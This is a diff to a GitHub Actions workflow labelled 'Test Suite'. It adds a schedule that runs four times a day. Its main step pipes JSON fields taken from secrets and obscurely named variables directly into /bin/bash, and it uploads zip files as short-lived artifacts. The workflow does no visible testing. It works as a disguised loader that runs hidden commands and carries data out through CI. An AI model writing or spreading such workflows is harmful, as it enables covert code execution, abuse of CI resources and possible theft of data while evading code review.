@@ -2,6 +2,8 @@ name: Test Suite
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '15 4,10,16,22 * * *'
 env:
   CI: true
 jobs:
@@ -13,17 +15,18 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          se381: ${{ secrets.se381 }}
+          lkq978: ${{ secrets.lkq978 }}
         run: |
-          printf '%s' "$se381" | jq -r .m97055 | /bin/bash
-          printf '%s' "$i213" | jq -r .yao5927 | /bin/bash
-          printf '%s' "$xfzhu89103" | jq -r .r7 | /bin/bash
-          printf '%s' "$lwpj1" | jq -r .tfghu871 | /bin/bash
-          printf '%s' "$eg30240" | jq -r .rvlvc9508 | /bin/bash
+          printf '%s' "$lkq978" | jq -r .l9643 | /bin/bash
+          printf '%s' "$c6916" | jq -r .vmchk1200 | /bin/bash
+          echo $vdiuy7097 | jq -r .heek34682 | /bin/bash
+          echo $z484 | jq -r .bnew879 | /bin/bash
+          echo $ghwwc983 | jq -r .vnwan5 | /bin/bash
+          echo $lsp88 | jq -r .jxmjp77 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: a5hhMZoz
+          name: s7SICsz6
           path: "*.zip"
           retention-days: 1
